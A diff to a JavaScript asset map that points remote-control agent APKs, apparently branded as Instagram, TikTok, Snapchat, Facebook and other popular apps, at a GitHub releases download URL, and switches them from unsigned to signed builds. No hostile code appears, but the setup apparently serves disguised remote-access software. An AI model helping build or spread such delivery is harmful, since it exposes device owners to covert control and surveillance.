@@ -1,15 +1,15 @@
 ﻿const RELEASE_BASE = "https://github.com/lovaerick93-source/test/releases/latest/download/";
 
 const ASSET_MAP = {
-  "remote-control-agent-default.apk": "android-agent-default-release-unsigned.apk",
-  "remote-control-agent-instagram.apk": "android-agent-instagram-release-unsigned.apk",
-  "remote-control-agent-twitter.apk": "android-agent-twitter-release-unsigned.apk",
-  "remote-control-agent-facebook.apk": "android-agent-facebook-release-unsigned.apk",
-  "remote-control-agent-linkedin.apk": "android-agent-linkedin-release-unsigned.apk",
-  "remote-control-agent-messenger.apk": "android-agent-messenger-release-unsigned.apk",
-  "remote-control-agent-youtube.apk": "android-agent-youtube-release-unsigned.apk",
-  "remote-control-agent-snapchat.apk": "android-agent-snapchat-release-unsigned.apk",
-  "remote-control-agent-tiktok.apk": "android-agent-tiktok-release-unsigned.apk",
+  "remote-control-agent-default.apk": "android-agent-default-release.apk",
+  "remote-control-agent-instagram.apk": "android-agent-instagram-release.apk",
+  "remote-control-agent-twitter.apk": "android-agent-twitter-release.apk",
+  "remote-control-agent-facebook.apk": "android-agent-facebook-release.apk",
+  "remote-control-agent-linkedin.apk": "android-agent-linkedin-release.apk",
+  "remote-control-agent-messenger.apk": "android-agent-messenger-release.apk",
+  "remote-control-agent-youtube.apk": "android-agent-youtube-release.apk",
+  "remote-control-agent-snapchat.apk": "android-agent-snapchat-release.apk",
+  "remote-control-agent-tiktok.apk": "android-agent-tiktok-release.apk",
   "remote-control-desktop.jar": "remote-control-desktop.jar",
   "remote-control-desktop.exe": "remote-control-desktop.exe",
 };
